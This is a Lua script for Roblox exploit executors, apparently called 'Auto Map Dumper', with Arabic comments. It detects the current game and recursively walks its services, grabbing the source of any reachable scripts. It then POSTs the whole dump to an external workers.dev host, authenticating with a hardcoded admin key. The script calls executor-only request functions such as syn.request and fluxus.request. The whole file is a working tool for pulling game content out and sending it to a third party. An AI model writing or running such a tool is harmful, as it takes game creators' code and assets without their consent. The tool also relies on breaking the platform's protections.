-- ╔══════════════════════════════════════════════╗
-- ║       Auto Map Dumper — CrypticLua           ║
-- ║  شغّله في أي ماب — يكتشف الاسم تلقائياً     ║
-- ╚══════════════════════════════════════════════╝

local ADMIN_KEY   = "1bc82c1b3ae1691db7bd9f57473b2908e288bafc6cbe41ce"
local BASE_URL    = "https://roblox-scripts.crypticluaobf.workers.dev"
local ALLOWED     = 7536106759
local MAX_DEPTH   = 7
local MAX_CHILDREN= 60

-- ── Auth check ──────────────────────────────────
local Players = game:GetService("Players")
local lp = Players.LocalPlayer or Players.PlayerAdded:Wait()
if lp.UserId ~= ALLOWED then return end

local HttpService = game:GetService("HttpService")

-- ── Detect map name ──────────────────────────────
local mapName = nil

-- Method 1: MarketplaceService (most accurate)
pcall(function()
    local info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
    if info and info.Name and #info.Name > 0 then
        mapName = info.Name
    end
end)

-- Method 2: game.Name fallback
if not mapName or mapName == "Roblox" then
    pcall(function()
        if game.Name and #game.Name > 0 and game.Name ~= "Roblox" then
            mapName = game.Name
        end
    end)
end

-- Method 3: PlaceId as last resort
if not mapName then
    mapName = "Place_" .. tostring(game.PlaceId)
end

print("[AutoDump] Map detected: " .. mapName)
print("[AutoDump] PlaceId: " .. tostring(game.PlaceId))

-- ── Show UI notification ─────────────────────────
local function makeNotif(msg, color)
    pcall(function()
        local CoreGui = game:GetService("CoreGui")
        pcall(function()
            local old = CoreGui:FindFirstChild("AutoDumpNotif")
            if old then old:Destroy() end
        end)
        local sg = Instance.new("ScreenGui")
        sg.Name = "AutoDumpNotif"
        sg.ResetOnSpawn = false
        sg.Parent = CoreGui

        local f = Instance.new("Frame")
        f.Size = UDim2.new(0, 300, 0, 52)
        f.Position = UDim2.new(0.5, -150, 1, -70)
        f.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
        f.BorderSizePixel = 0
        f.Parent = sg
        Instance.new("UICorner", f).CornerRadius = UDim.new(0, 10)
        local s = Instance.new("UIStroke", f)
        s.Color = color or Color3.fromRGB(80, 180, 255)
        s.Thickness = 1.5

        local t = Instance.new("TextLabel")
        t.Size = UDim2.new(1, -16, 1, 0)
        t.Position = UDim2.new(0, 8, 0, 0)
        t.BackgroundTransparency = 1
        t.Text = msg
        t.TextColor3 = Color3.fromRGB(240, 240, 240)
        t.TextSize = 13
        t.Font = Enum.Font.GothamBold
        t.TextXAlignment = Enum.TextXAlignment.Left
        t.Parent = f

        -- Auto hide after 5s
        task.delay(5, function()
            pcall(function() sg:Destroy() end)
        end)
    end)
end

makeNotif("🔍 جاري كشف: " .. mapName, Color3.fromRGB(80, 180, 255))

-- ── HTTP helper ──────────────────────────────────
local function httpPost(url, body)
    local result = nil
    -- Try multiple executor request functions
    local function try(fn)
        if result then return end
        local ok, r = pcall(fn)
        if ok and r then result = r end
    end

    local opts = {
        Url = url, Method = "POST",
        Headers = { ["Content-Type"] = "application/json", ["X-Admin-Key"] = ADMIN_KEY },
        Body = body
    }

    try(function() return syn.request(opts) end)
    try(function() return request(opts) end)
    try(function() return http.request(opts) end)
    try(function() return http_request(opts) end)
    try(function() return fluxus.request(opts) end)

    return result
end

-- ── Step 1: Find or create map ───────────────────
print("[AutoDump] Registering map on website...")
local mapId = nil
local mapPayload = HttpService:JSONEncode({
    name   = mapName,
    gameId = tostring(game.PlaceId)
})

local mapResp = httpPost(BASE_URL .. "/api/maps/find-or-create", mapPayload)
if mapResp and mapResp.Body then
    local ok, parsed = pcall(HttpService.JSONDecode, HttpService, mapResp.Body)
    if ok and parsed and parsed.id then
        mapId = parsed.id
        print("[AutoDump] Map ID: " .. mapId)
    end
end

if not mapId then
    makeNotif("❌ فشل التسجيل على الموقع", Color3.fromRGB(255, 80, 80))
    warn("[AutoDump] Could not register map. Check executor HTTP support.")
    return
end

makeNotif("📦 جاري مسح ملفات: " .. mapName, Color3.fromRGB(255, 200, 50))

-- ── Step 2: Dump instance tree ───────────────────
local function safe(fn)
    local ok, r = pcall(fn)
    return ok and r or nil
end

local function dump(inst, depth)
    if depth > MAX_DEPTH then return nil end
    local node = { n = inst.Name, c = inst.ClassName }
    if inst.ClassName == "LocalScript" or inst.ClassName == "Script" or inst.ClassName == "ModuleScript" then
        local src = safe(function() return inst.Source end)
        if src and #src > 0 then node.s = src:sub(1, 8000) end
    end
    local ok, children = pcall(function() return inst:GetChildren() end)
    if ok and children and #children > 0 then
        node.ch = {}
        for i = 1, math.min(#children, MAX_CHILDREN) do
            local d = dump(children[i], depth + 1)
            if d then table.insert(node.ch, d) end
        end
    end
    return node
end

local serviceNames = {
    "Workspace", "Players", "ReplicatedStorage", "ReplicatedFirst",
    "StarterGui", "StarterPack", "StarterPlayer", "Teams",
    "SoundService", "Lighting", "Chat"
}

print("[AutoDump] Scanning " .. #serviceNames .. " services...")
local tree = {}
for _, svc in ipairs(serviceNames) do
    local ok, inst = pcall(function() return game:GetService(svc) end)
    if ok and inst then
        local d = dump(inst, 0)
        if d then table.insert(tree, d) end
    end
end

-- ── Step 3: Send dump ────────────────────────────
local payload = HttpService:JSONEncode({
    map    = mapId,
    name   = mapName,
    gameId = tostring(game.PlaceId),
    time   = os.time(),
    tree   = tree
})

print("[AutoDump] Sending " .. math.floor(#payload / 1024) .. " KB...")

local dumpResp = httpPost(BASE_URL .. "/api/maps/" .. mapId .. "/dump", payload)
if dumpResp then
    makeNotif("✅ تم! " .. mapName .. " — " .. #tree .. " services", Color3.fromRGB(80, 255, 120))
    print("[AutoDump] Done! Open website to browse files.")
    print("[AutoDump] URL: " .. BASE_URL)
else
    makeNotif("❌ فشل الإرسال", Color3.fromRGB(255, 80, 80))
    warn("[AutoDump] Failed to send dump.")
end
